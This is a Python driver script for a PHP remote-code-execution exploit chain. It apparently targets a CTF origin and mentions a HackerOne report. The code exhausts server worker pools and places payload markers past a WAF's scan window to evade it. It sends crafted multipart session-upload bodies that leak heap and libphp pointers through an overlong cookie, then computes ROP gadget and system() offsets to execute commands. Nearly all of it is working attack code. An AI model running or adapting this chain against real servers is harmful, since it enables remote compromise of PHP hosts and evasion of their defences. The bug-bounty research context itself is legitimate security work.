"""Live driver: the exp_aa choreography adapted for the CTF origin.

Deltas vs exp_aa.main():
  * --tls: every connection is TLS-wrapped (origin :443) and every request
    Host: line is rewritten to the real host (the edge 400s on Host: x/v).
  * the pin is a paced 0.25s loop of a fixed count (the edge burst-throttle
    refuses parallel opens; V9 measured 160/160 at 0.25s pacing).
  * the full-pool scrub is skipped (the origin sandbox is born fresh; the
    scrub exists for the lab's retirement-mark quirk only).
  * build_leak_body_live moves the PHPSESSID + progress pair AFTER the first
    two [511] fills (~4.2MB of 'A' sea) so the PHP_SESSION_UPLOAD_PROGRESS
    signature sits beyond the WAF's ~1-2MB body-scan window.  The fill part
    order is unchanged, so the pop choreography is identical; the session
    START callback (the stale-id initialize path) merely fires two fills
    later.
  * X-Attempt-ID and the status lines of every response are echoed for the
    HackerOne report.

With --tls off the driver runs the identical flow in cleartext against a
local lab container (the pre-live verification mode).
"""
import argparse
import re
import socket
import ssl
import sys
import tempfile
import threading
import time
from pathlib import Path

import exp_aa as E

LIVE_HOST = "php-rce.cloudflare.app"


def install_socket_patch(live_host: str | None) -> None:
    """TLS-wrap :443 and rewrite the Host: line when live_host is set."""
    original_create = socket.create_connection

    def patched_create(address, timeout=None, **kwargs):
        sock = original_create(address, timeout=timeout, **kwargs)
        if address[1] == 443:
            ctx = ssl.create_default_context()
            sock = ctx.wrap_socket(sock, server_hostname=address[0])
        if live_host:
            hostb = live_host.encode()
            original_sendall = sock.sendall

            def sendall(data, *a, **k):
                if b"\r\nHost: " in data[:2048]:
                    head, rest = data.split(b"\r\n", 1)
                    lines = rest.split(b"\r\n")
                    for i, line in enumerate(lines):
                        if line[:5].lower() == b"host:":
                            lines[i] = b"Host: " + hostb
                            break
                    data = head + b"\r\n" + b"\r\n".join(lines)
                return original_sendall(data, *a, **k)

            sock.sendall = sendall
        return sock

    socket.create_connection = patched_create


def build_tiny_b1(path: Path, args: argparse.Namespace) -> None:
    """The ~KB leak body: 8-byte-periodic forged-len fields.

    Each field's value repeats pack(FORGE) every 8 bytes so ANY 8-aligned
    block landing adjacent-below the stale sid overwrites ZSTR_LEN.
    Size classes are mixed so several block geometries are covered.
    """
    import struct as _s
    forge = _s.pack("<Q", args.tiny_b1_len)
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + E.MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a")
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    # value length per field: 46 (0x40 class), 110 (0x80), 238 (0x100)
    for i in range(args.tiny_b1_n):
        vlen = (46, 110, 238)[i % 3]
        part(("t%04d" % i).encode(), (forge * (vlen // 8 + 1))[:vlen])
    out.extend(b"--" + E.MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    print(f"body={len(out)} tiny_fields={args.tiny_b1_n} "
          f"forge_len={args.tiny_b1_len:#x}")


def start_cl(host: str, port: str, path: str, body: Path,
             response: Path, timeout: float):
    """CL-framed POST (the CF-to-origin shape): makes the local lab enforce
    php post_max_size exactly like the live target, where Cloudflare
    de-chunks our chunked body and forwards it with a Content-Length."""
    import socket as _s
    data = body.read_bytes()
    sock = _s.create_connection((host, int(port)), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(b"POST " + path.encode() + b" HTTP/1.1\r\nHost: x\r\n"
                 b"Content-Type: multipart/form-data; boundary="
                 + E.MULTIPART_BOUNDARY + b"\r\n"
                 b"Content-Length: " + str(len(data)).encode()
                 + b"\r\nConnection: close\r\n\r\n")
    proc = {"sock": sock, "resp_path": response, "sent": 0, "total": len(data)}

    def pump() -> None:
        off = 0
        while off < len(data):
            piece = data[off:off + 65536]
            sock.sendall(piece)
            off += len(piece)
        proc["sent"] = off

    import threading as _t
    t = _t.Thread(target=pump, daemon=True)
    t.start()
    return proc


def finish_cl(proc, timeout: float) -> bytes:
    import socket as _s
    sock = proc["sock"]
    buf = bytearray()
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            buf.extend(d)
            if len(buf) > 1 << 22:
                break
    except (_s.timeout, OSError):
        pass
    try:
        sock.close()
    except OSError:
        pass
    proc["resp_path"].write_bytes(bytes(buf))
    return bytes(buf)


def build_leak_body_live(path: Path, args: argparse.Namespace) -> None:
    """The B1 body with the signature pair behind two [511] fills."""
    fake_len = args.fake_len
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + E.MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    index = 0
    if args.pages_list:
        pages_sequence = [int(p, 0) for p in args.pages_list.split(",")]
    else:
        pages_sequence = ([511, 511] + [args.small_pages] * 12
                          + [args.mid_pages, 511])
    if args.plug_len:
        # Sanitizer plug: a value-copy that best-fits a mid-size free run,
        # shielding stale A1-era strings from the ps_close_files free.
        part(b"plug", b"Z" * args.plug_len)
    for fill_index, pages in enumerate(pages_sequence):
        value = E.leak_forge_fill_value(
            pages, args.forge_page, fake_len, index, True)
        name = (b"f%04d" % index).ljust(120, b"f")[:120]
        part(name, value)
        index += 1
        if fill_index == 1:
            part(b"PHPSESSID", b"a")
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for _ in range(args.nested_fields):
        name = ("x%05d" % index).encode() + b"[a]" * 12
        part(name, b"v")
        index += 1
    out.extend(b"--" + E.MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    print(f"body={len(out)} fields={index} fake_len={fake_len:#x}")


def paced_pin(host: str, port: int, count: int, pace: float,
              holders: list) -> int:
    """Pin `count` workers at `pace` seconds per connection."""
    accepted = 0
    refused_streak = 0
    for i in range(count):
        try:
            holders.append(E.open_accepted_holder(host, port, 3.0))
        except Exception as exc:
            print(f"[!] holder {i} refused: {exc!r}", flush=True)
            refused_streak += 1
            if accepted >= 140 and refused_streak >= 2:
                print("[*] pool full; stopping pin early", flush=True)
                break
            time.sleep(pace)
            continue
        refused_streak = 0
        accepted += 1
        if accepted % 25 == 0:
            print(f"[*] paced holders {accepted}/{count}", flush=True)
        time.sleep(pace)
    return accepted


def state_probe(args, count: int = 2) -> str | None:
    """Two tiny multipart requests on the lane child.

    A stale PS(id)+send_cookie makes every probe re-emit the SAME
    PHPSESSID (no create_sid); a dead state creates fresh sids.
    """
    cookies = []
    for i in range(count):
        body = (b"--" + E.MULTIPART_BOUNDARY
                + b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"
                + b"z" * 1100000
                + b"\r\n--" + E.MULTIPART_BOUNDARY
                + b"\r\nContent-Disposition: form-data; "
                + b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nk" + str(i).encode()
                + b"\r\n--" + E.MULTIPART_BOUNDARY
                + b"--\r\n")
        request = (
            b"POST " + args.path.encode() + b" HTTP/1.1\r\nHost: v\r\n"
            b"Content-Type: multipart/form-data; boundary="
            + E.MULTIPART_BOUNDARY
            + b"\r\nContent-Length: " + str(len(body)).encode()
            + b"\r\nConnection: close\r\n\r\n" + body)
        response = E.http_exchange(args.host, args.port, request, 20.0)
        cookie = E.cookie_value(response)
        cookies.append(cookie)
        print(f"[*] state-probe[{i}] cookie={cookie[:40]!r}", flush=True)
    if len(cookies) == 2 and cookies[0] and cookies[0] == cookies[1]:
        print("[+] STATE ALIVE: the stale sid is re-emitted")
        return "ALIVE"
    print("[-] state dead: fresh sids per probe (or no cookies)")
    return "DEAD"


def echo_head(tag: str, response: bytes) -> None:
    head = response.split(b"\r\n\r\n", 1)[0]
    interesting = [ln for ln in head.split(b"\r\n")
                   if b"X-Attempt-ID" in ln or ln.startswith(b"HTTP/")]
    print(f"[*] {tag} head: " + " | ".join(
        ln.decode("latin-1") for ln in interesting), flush=True)


def _read_http_response(sock: socket.socket) -> tuple[bytes, bytes]:
    """Read one HTTP response (chunked or Content-Length) off a keep-alive
    socket and return (head, body)."""
    buf = bytearray()
    while b"\r\n\r\n" not in buf:
        d = sock.recv(65536)
        if not d:
            return bytes(buf), b""
        buf.extend(d)
    head, _, rest = bytes(buf).partition(b"\r\n\r\n")
    if b"Transfer-Encoding: chunked" in head:
        body = bytearray()
        while True:
            while b"\r\n" not in rest:
                d = sock.recv(65536)
                if not d:
                    return head, bytes(body)
                rest += d
            line, _, rest = rest.partition(b"\r\n")
            try:
                n = int(line.split(b";")[0], 16)
            except ValueError:
                return head, bytes(body)
            if n == 0:
                return head, bytes(body)
            while len(rest) < n:
                d = sock.recv(65536)
                if not d:
                    return head, bytes(body)
                rest += d
            body.extend(rest[:n])
            rest = rest[n:]
    m = re.search(rb"Content-Length: (\d+)", head)
    cl = int(m.group(1)) if m else 0
    while len(rest) < cl:
        d = sock.recv(65536)
        if not d:
            break
        rest += d
    return head, rest[:cl]


def _send_chunked_ka(sock: socket.socket, body: bytes, path: str) -> None:
    sock.sendall(b"POST " + path.encode() + b" HTTP/1.1\r\nHost: x\r\n"
                 b"Content-Type: multipart/form-data; boundary="
                 + E.MULTIPART_BOUNDARY
                 + b"\r\nTransfer-Encoding: chunked\r\n"
                   b"Connection: keep-alive\r\n\r\n")
    off = 0
    while off < len(body):
        piece = body[off:off + 65536]
        sock.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
        off += len(piece)
    sock.sendall(b"0\r\n\r\n")


def run_ka(args: argparse.Namespace) -> int:
    """One-socket chain: A1 arms the child, B1 fires on the SAME child."""
    import re as _re
    with tempfile.TemporaryDirectory(prefix="ka-8511-") as tmp_s:
        tmp = Path(tmp_s)
        a1 = tmp / "a1.bin"
        if getattr(args, "a1_file", None):
            a1.write_bytes(Path(args.a1_file).read_bytes())
            print(f"[*] A1 body from {args.a1_file}: {a1.stat().st_size}B")
        else:
            E.build_a1_body(a1, args)
            print(f"[*] A1 body built: {a1.stat().st_size}B")
        if not getattr(args, "b1_file", None):
            print("[-] --ka requires --b1-file")
            return 1
        b1 = Path(args.b1_file).read_bytes()
        print(f"[*] B1 body from {args.b1_file}: {len(b1)}B")
        sock = socket.create_connection((args.host, args.port),
                                        timeout=args.timeout)
        sock.settimeout(args.timeout)
        _send_chunked_ka(sock, a1.read_bytes(), args.path + args.query)
        h1, r1 = _read_http_response(sock)
        print(f"[*] A1: {h1.split(chr(13).encode() + chr(10).encode(), 1)[0]!r} "
              f"resp={len(r1)}")
        print("[*] A1 body: " + repr(r1[:300]), flush=True)
        time.sleep(args.pause_after_a1 if args.pause_after_a1 else 0.4)
        # mid-parse stall on the SAME socket: the connection stays busy so
        # gdb can identify and attach to the armed child (KeepAliveTimeout=5
        # makes a plain --pause-after-a1 close the socket before any probe).
        if getattr(args, "gdb_stall", 0):
            cut = min(args.gdb_stall_bytes, len(b1))
            piece = b1[:cut]
            sock.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            print(f"[*] B1 stalled at {cut}B for {args.gdb_stall:g}s "
                  "(gdb window)", flush=True)
            time.sleep(args.gdb_stall)
            off = cut
            while off < len(b1):
                p2 = b1[off:off + 65536]
                sock.sendall(f"{len(p2):x}\r\n".encode() + p2 + b"\r\n")
                off += len(p2)
            sock.sendall(b"0\r\n\r\n")
        else:
            _send_chunked_ka(sock, b1, args.path)
        h2, response = _read_http_response(sock)
        try:
            sock.close()
        except OSError:
            pass
        echo_head("B1(ka)", h2 + b"\r\n\r\n")
        encoded = E.cookie_value(h2 + b"\r\n\r\n" + response)
        print(f"[*] B1 response={len(response)} encoded_cookie={len(encoded)}")
        if not encoded:
            print("[-] no Set-Cookie PHPSESSID value")
            return 1
        result = E.summarize_cookie(encoded, args.pointer_floor)
        decoded = result["decoded"]
        pointers = result["pointers"]
        print(f"[*] decoded_cookie={len(decoded)} "
              f"candidates={len(pointers)}")
        for value, count in result["top"]:
            print(f"    {value:#014x} count={count}")
        if len(decoded) <= 256:
            print(f"[-] normal-size cookie: {decoded!r}")
            return 2
        if not pointers:
            print("[+] overlong Set-Cookie disclosure reproduced "
                  "(no pointers)")
            return 0
        from collections import Counter
        dominant, count = pointers.most_common(1)[0]
        bucket_counter = Counter()
        for value, value_count in pointers.items():
            bucket_counter[value & ~0x1FFFFF] += value_count
        print(f"[+] dominant={dominant:#x} count={count}")
        print("[+] 2MiB pointer buckets: " + repr([
            (hex(base), bucket_count)
            for base, bucket_count in bucket_counter.most_common(8)]))
        best_base = None
        best_votes = 0
        base_votes = Counter()
        for value, value_count in pointers.items():
            base_votes[(value - args.zval_ptr_dtor_offset)
                       & ~0x1FFFFF] += value_count
        for base, votes in base_votes.most_common(4):
            print(f"[+] base vote {base:#x} votes={votes}")
            if votes > best_votes:
                best_votes = votes
                best_base = base
        if best_base is None or best_votes < 5:
            print("[-] no dtor-aligned libphp base in the leak buckets")
            return 4
        libphp = best_base
        print("[+] overlong Set-Cookie disclosure reproduced (ka)")
        if args.rce is None:
            return 0
        heap = bucket_counter.most_common(1)[0][0]
        print(f"[+] derived main_chunk={heap:#x} "
              f"(libphp{heap - libphp:+#x} this run)")
        sys.stdout.flush()
        if args.pause_before_rce:
            print(f"[*] pausing {args.pause_before_rce:g}s before RCE",
                  flush=True)
            time.sleep(args.pause_before_rce)
        proof_url = (E.DEFAULT_RCE_PROOF_URL
                     if args.rce == E.DEFAULT_RCE_COMMAND else None)
        rce_verified = E.amplified_rce(args, heap, libphp, args.rce,
                                       proof_url)
        if rce_verified is False:
            print("[-] composed leak-to-RCE stage failed")
            return 6
        if rce_verified:
            print("[+] composed leak-to-RCE chain succeeded")
        else:
            print("[?] composed leak-to-RCE payload delivered; "
                  "execution unverified")
        return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=LIVE_HOST)
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--path", default="php/index.php")
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--holders", type=int, default=160)
    ap.add_argument("--wait-file", default=None,
                    help="pause after the pin until this path exists "
                         "(lets the driver finish the rinse first)")
    ap.add_argument("--pace", type=float, default=0.25)
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--a1-big", type=int, default=78)
    ap.add_argument("--tiny-b1-n", type=int, default=0,
                    help="use the tiny forged-len B1 with N fields")
    ap.add_argument("--tiny-b1-len", type=lambda x: int(x, 0), default=0x2000,
                    help="the forged ZSTR_LEN for the tiny B1")
    ap.add_argument("--b1-file", default=None,
                    help="use this prebuilt body as the B1 verbatim")
    ap.add_argument("--a1-file", default=None,
                    help="use this prebuilt body as the A1 verbatim")
    ap.add_argument("--post-file", default=None,
                    help="third body after the B1 on the earmarked child")
    ap.add_argument("--post-delay", type=float, default=1.0)
    ap.add_argument("--post2-file", default=None,
                    help="fourth body after post on the earmarked child")
    ap.add_argument("--post2-delay", type=float, default=1.0)
    ap.add_argument("--pause-after-a1", type=float, default=0.0,
                    help="pause between the A1 response and the B1 send "
                         "(post-fatal state walk window)")
    ap.add_argument("--a1-parts", type=int, default=860,
                    help="nested parts in the A1 (the (859,860) gap knob)")
    ap.add_argument("--a1-fillers128", type=int, default=14)
    ap.add_argument("--a1-keypad", type=int, default=90)
    ap.add_argument("--a1-dummies", type=int, default=0)
    ap.add_argument("--a1-churn", action="store_true",
                    help="64B-class churn names (the V9 live combo with "
                         "dummies)")
    ap.add_argument("--a1-filepad", type=int, default=0)
    ap.add_argument("--force-rce", action="store_true")
    ap.add_argument("--pause-after-rebind", type=float, default=0.0)
    ap.add_argument("--state-probe", action="store_true")
    ap.add_argument("--a1-gdb-stall", type=float, default=0.0)
    ap.add_argument("--a1-gdb-stall-bytes", type=int, default=1000000)
    ap.add_argument("--a1-big-shrink", default="",
                    help="index:bytes - shorten one big's value")
    ap.add_argument("--a1-burners", type=int, default=19)
    ap.add_argument("--a1-burner-len", type=int, default=4000)
    ap.add_argument("--a1-progress-len", type=int, default=4072)
    ap.add_argument("--a1-progress-position", type=int, default=None,
                    help="A1 progress-part position among the big fields "
                         "(retunes the sid-chunk cache depth)")
    ap.add_argument("--query", default=E.DEFAULT_QUERY)
    ap.add_argument("--forge-page", type=lambda x: int(x, 0), default=0x1E3)
    ap.add_argument("--mid-pages", type=int, default=483)
    ap.add_argument("--small-pages", type=int, default=511)
    ap.add_argument("--pages-list", default="",
                    help="comma page counts per fill, e.g. 256,256,511")
    ap.add_argument("--b1-cl", action="store_true",
                    help="send B1/post CL-framed (replicates CF's "
                         "de-chunking; makes local lab enforce the live "
                         "8MiB post_max_size wall)")
    ap.add_argument("--pause-after-b1", type=float, default=0.0,
                    help="seconds to pause after the B1 (gdb window for "
                         "the B1-body's armed state)")
    ap.add_argument("--gdb-stall", type=float, default=0.0,
                    help="seconds to stall the B1 stream after "
                         "--gdb-stall-bytes (gdb attach window)")
    ap.add_argument("--gdb-stall-bytes", type=int, default=180000,
                    help="B1 byte offset of the gdb stall window")
    ap.add_argument("--plug-len", type=lambda x: int(x, 0), default=0,
                    help="sanitizer plug value size (0 = off); ~774144 "
                         "best-fits the stale ps_files 192-page run")
    ap.add_argument("--nested-fields", type=int, default=900)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x1C000)
    ap.add_argument("--pointer-floor", type=lambda x: int(x, 0),
                    default=0x6F0000000000)
    ap.add_argument("--zval-ptr-dtor-offset", type=lambda x: int(x, 0),
                    default=0x7b47a0)
    ap.add_argument("--rce", nargs="?", const=E.DEFAULT_RCE_COMMAND,
                    metavar="COMMAND")
    ap.add_argument("--proof-url", default=None,
                    help="POST-fetch this URL after the RCE to verify a "
                         "custom command's side effect")
    ap.add_argument("--heap-from-lib-delta", type=lambda x: int(x, 0),
                    default=-0x2400000)
    ap.add_argument("--rce-block-offset", type=lambda x: int(x, 0),
                    default=0x5C400)
    ap.add_argument("--rce-headers", type=int, default=402500)
    ap.add_argument("--pause-before-rce", type=float, default=0.0,
                    help="debug-only pause after disclosure and before RCE")
    ap.add_argument("--pivot-offset", type=lambda x: int(x, 0),
                    default=0x64904E)
    ap.add_argument("--pop-rdi-offset", type=lambda x: int(x, 0),
                    default=0x197128)
    ap.add_argument("--pop-rsi-offset", type=lambda x: int(x, 0),
                    default=0x195A89)
    ap.add_argument("--ret-offset", type=lambda x: int(x, 0),
                    default=0x197129)
    ap.add_argument("--zif-system-offset", type=lambda x: int(x, 0),
                    default=0x5996E0)
    ap.add_argument("--ka", action="store_true",
                    help="one-socket keep-alive chain: A1 then B1 on the "
                         "same connection = the same prefork child (no "
                         "pin, no rebind, no routing race)")
    args = ap.parse_args()
    if not args.path.startswith("/"):
        args.path = "/" + args.path
    E.TARGET_PATH = args.path
    if args.tls:
        install_socket_patch(args.host if args.port == 443 else None)
    if args.ka:
        return run_ka(args)

    holders: list = []
    holder_stop = threading.Event()
    holder_thread = threading.Thread(
        target=E.keep_holders_alive, args=(holders, holder_stop),
        daemon=True)
    holder_thread.start()
    try:
        accepted = paced_pin(args.host, args.port, args.holders,
                             args.pace, holders)
        if accepted < min(120, args.holders - 20):
            print(f"[-] only {accepted} holders accepted; aborting")
            return 1
        print(f"[*] pinned {accepted} workers", flush=True)
        if getattr(args, "wait_file", None):
            _wf = Path(args.wait_file)
            _t0 = time.time()
            while not _wf.exists() and time.time() - _t0 < 420:
                time.sleep(0.5)
            print(f"[*] wait_file cleared after {time.time() - _t0:.1f}s",
                  flush=True)

        with tempfile.TemporaryDirectory(prefix="live-8511-") as tmp_s:
            tmp = Path(tmp_s)
            a1 = tmp / "a1.bin"
            E.build_a1_body(a1, args)
            a1_response = tmp / "a1.resp"
            b1 = tmp / "b1.bin"
            if getattr(args, "b1_file", None):
                b1.write_bytes(Path(args.b1_file).read_bytes())
                print(f"[*] B1 body from {args.b1_file}: {b1.stat().st_size}B")
            elif getattr(args, "tiny_b1_n", 0):
                build_tiny_b1(b1, args)
            else:
                build_leak_body_live(b1, args)
            b1_response = tmp / "b1.resp"

            old_holder = holders.pop()
            rebound = None
            for rebind_attempt in range(1, 3):
                old_port = old_holder.getsockname()[1]
                try:
                    E.cleanly_release_holder(
                        old_holder, args.host, args.port, args.path, 15.0)
                except (OSError, RuntimeError) as exc:
                    E.close_holder(old_holder)
                    print(f"[*] clean rebind probe closed early: {exc}")
                rebound = E.open_accepted_holder(args.host, args.port, 30.0)
                print(f"[*] rebind attempt={rebind_attempt} "
                      f"old_port={old_port} "
                      f"new_port={rebound.getsockname()[1]}")
                if rebind_attempt == 1:
                    old_holder = rebound
            holders.append(rebound)
            queued_release_index = len(holders) - 1

            released = holders.pop(queued_release_index)
            local_port = released.getsockname()[1]
            E.close_holder(released)
            print(f"[*] released rebound holder client_port={local_port}; "
                  "earmarked child free for the A1")
            if getattr(args, "pause_after_rebind", 0):
                print(f"[*] pausing {args.pause_after_rebind:g}s after "
                      "rebind (gdb pre-A1 window)", flush=True)
                time.sleep(args.pause_after_rebind)
            if getattr(args, "a1_file", None):
                a1.write_bytes(Path(args.a1_file).read_bytes())
                print(f"[*] A1 body from {args.a1_file}: "
                      f"{a1.stat().st_size}B")
            a1_process = E.start_chunked(
                args.host, args.port, args.path + args.query, a1,
                a1_response, 900.0,
                stall_bytes=(args.a1_gdb_stall_bytes
                             if args.a1_gdb_stall else 0),
                stall_seconds=args.a1_gdb_stall)
            # SERIALIZED FLOW (live-B1 RST fix): the B1 must not queue in the
            # origin backlog behind the A1 — CF's tunnel resets an unaccepted
            # origin connection once ~2MB buffers up (RUN BY: B1 killed at
            # 19.47s / ~1.9MB, resp=0).  Instead: wait for the A1's fatal
            # response; the earmarked child then returns to accept() as the
            # only idle worker and takes the B1 connection, so the origin
            # drains the 17.7MB body live.
            E.finish_chunked(a1_process, a1_response, 300.0)
            a1_bytes = a1_response.read_bytes()
            print(f"[*] A1 response={len(a1_bytes)}")
            echo_head("A1", a1_bytes)
            print("[*] A1 body: " + repr(a1_bytes[a1_bytes.find(b"\r\n\r\n") + 4:][:500]), flush=True)
            if getattr(args, "state_probe", False):
                state_probe(args)
                return 0
            if getattr(args, "pause_after_a1", 0):
                print(f"[*] pausing {args.pause_after_a1:g}s after the A1 "
                      "(post-fatal state walk window)", flush=True)
                time.sleep(args.pause_after_a1)
            time.sleep(0.3)
            if getattr(args, "b1_cl", False):
                b1_process = start_cl(args.host, args.port, args.path, b1,
                                      b1_response, args.timeout)
                response = finish_cl(b1_process, args.timeout + 30.0)
            else:
                b1_process = E.start_chunked(
                    args.host, args.port, args.path, b1, b1_response,
                    args.timeout,
                    stall_bytes=(args.gdb_stall_bytes if args.gdb_stall else 0),
                    stall_seconds=args.gdb_stall)
                response = E.finish_chunked(b1_process, b1_response,
                                            args.timeout + 30.0)
            if getattr(args, "pause_after_b1", 0):
                print(f"[*] pausing {args.pause_after_b1:g}s after the B1 "
                      "(post-B1 state walk window)", flush=True)
                time.sleep(args.pause_after_b1)
            if getattr(args, "post_file", None):
                # third body on the same earmarked child (still the only
                # idle worker): R1(season) -> B1-slot(arm) -> post(leak)
                post = tmp / "post.bin"
                post.write_bytes(Path(args.post_file).read_bytes())
                post_response = tmp / "post.resp"
                print(f"[*] post body from {args.post_file}: "
                      f"{post.stat().st_size}B", flush=True)
                time.sleep(getattr(args, "post_delay", 1.0) or 0)
                if getattr(args, "b1_cl", False):
                    p3 = start_cl(args.host, args.port, args.path, post,
                                  post_response, args.timeout)
                    r3 = finish_cl(p3, args.timeout + 30.0)
                elif getattr(args, "gdb_stall", 0):
                    p3 = E.start_chunked(
                        args.host, args.port, args.path, post,
                        post_response, args.timeout,
                        stall_bytes=args.gdb_stall_bytes,
                        stall_seconds=args.gdb_stall)
                    r3 = E.finish_chunked(p3, post_response,
                                          args.timeout + 30.0)
                else:
                    p3 = E.start_chunked(args.host, args.port, args.path, post,
                                         post_response, args.timeout)
                    r3 = E.finish_chunked(p3, post_response,
                                          args.timeout + 30.0)
                ck3 = E.cookie_value(r3)
                print(f"[*] post response={len(r3)} cookie_len={len(ck3)}")
                Path("post_live.resp").write_bytes(r3)
                response = r3
            if getattr(args, "post2_file", None):
                post2 = tmp / "post2.bin"
                post2.write_bytes(Path(args.post2_file).read_bytes())
                post2_response = tmp / "post2.resp"
                print(f"[*] post2 body from {args.post2_file}: "
                      f"{post2.stat().st_size}B", flush=True)
                time.sleep(getattr(args, "post2_delay", 1.0) or 0)
                p4 = E.start_chunked(args.host, args.port, args.path, post2,
                                     post2_response, args.timeout)
                r4 = E.finish_chunked(p4, post2_response,
                                      args.timeout + 30.0)
                ck4 = E.cookie_value(r4)
                print(f"[*] post2 response={len(r4)} cookie_len={len(ck4)}")
                Path("post2_live.resp").write_bytes(r4)
                response = r4

            echo_head("B1", response)
            Path("b1_live.resp").write_bytes(response)
            encoded = E.cookie_value(response)
            print(f"[*] B1 response={len(response)} "
                  f"encoded_cookie={len(encoded)}")
            if not encoded:
                print("[-] no Set-Cookie PHPSESSID value")
                return 1
            result = E.summarize_cookie(encoded, args.pointer_floor)
            decoded = result["decoded"]
            pointers = result["pointers"]
            print(f"[*] decoded_cookie={len(decoded)} "
                  f"candidates={len(pointers)}")
            for value, count in result["top"]:
                print(f"    {value:#014x} count={count}")
            forced = False
            if len(decoded) <= 256:
                if not getattr(args, "force_rce", False):
                    print(f"[-] normal-size cookie: {decoded!r}")
                    return 2
                forced = True
                print("[!] normal-size cookie; --force-rce: running the RCE "
                      "stage anyway for pad-landing calibration")
            if not pointers and not forced:
                print("[+] overlong Set-Cookie disclosure reproduced "
                      "(no pointers)")
                return 0
            if forced:
                from collections import Counter
                bucket_counter = Counter()
                heap = 0
                libphp = 0x111100000000
                dominant, count = 0, 0
            else:
                dominant, count = pointers.most_common(1)[0]
                from collections import Counter
                bucket_counter = Counter()
                for value, value_count in pointers.items():
                    bucket_counter[value & ~0x1FFFFF] += value_count
                print(f"[+] dominant={dominant:#x} count={count}")
                print("[+] 2MiB pointer buckets: " + repr([
                    (hex(base), bucket_count)
                    for base, bucket_count in bucket_counter.most_common(8)]))
                # Primary derivation: a dtor-shaped dominant pointer (needs
                # nested-fields=900 so the leak carries zval_ptr_dtor refs).
                # gdb-verified: dominant - dtor_offset == the real libphp
                # base.
                libphp = None
                if (count >= 100
                        and (dominant - args.zval_ptr_dtor_offset) & 0x1FFFFF
                        == 0):
                    libphp = dominant - args.zval_ptr_dtor_offset
                    print(f"[+] libphp base from dtor-dominant: {libphp:#x} "
                          f"(count={count})")
                else:
                    print("[!] dominant not dtor-shaped; base vote unreliable "
                          "for the RCE stage (use --nested-fields 900)")
                if libphp is None:
                    print("[-] no verified libphp base in the leak")
                    return 4
            print("[+] overlong Set-Cookie disclosure reproduced")
            if args.rce is None:
                return 0
            if count < 5 and not forced:
                print("[-] base vote too weak for the RCE stage")
                return 4
            # The main chunk = the top 2MiB pointer bucket: the heap-internal
            # free-list links concentrate there (903 votes on every healthy
            # leak; runner-up buckets poll ~26).  The lib→heap delta is
            # boot-random (measured -0x2400000, +0x2000000, +0x600000 across
            # container boots), so derive it per run instead of assuming.
            heap = (bucket_counter.most_common(1)[0][0]
                   if bucket_counter else 0)
            print(f"[+] derived main_chunk={heap:#x} "
                  f"(libphp{heap - libphp:+#x} this boot)")
            sys.stdout.flush()
            if args.pause_before_rce:
                print(f"[*] pausing {args.pause_before_rce:g}s before RCE",
                      flush=True)
                time.sleep(args.pause_before_rce)
            time.sleep(0.2)
            proof_url = args.proof_url
            if proof_url is None and args.rce == E.DEFAULT_RCE_COMMAND:
                proof_url = E.DEFAULT_RCE_PROOF_URL
            rce_verified = E.amplified_rce(
                args, heap, libphp, args.rce, proof_url)
            if rce_verified is False:
                print("[-] composed leak-to-RCE stage failed")
                return 6
            if rce_verified:
                print("[+] composed leak-to-RCE chain succeeded")
            else:
                print("[?] composed leak-to-RCE payload delivered; "
                      "execution unverified")
            return 0
    finally:
        holder_stop.set()
        holder_thread.join(timeout=2)
        for sock in holders:
            try:
                sock.close()
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
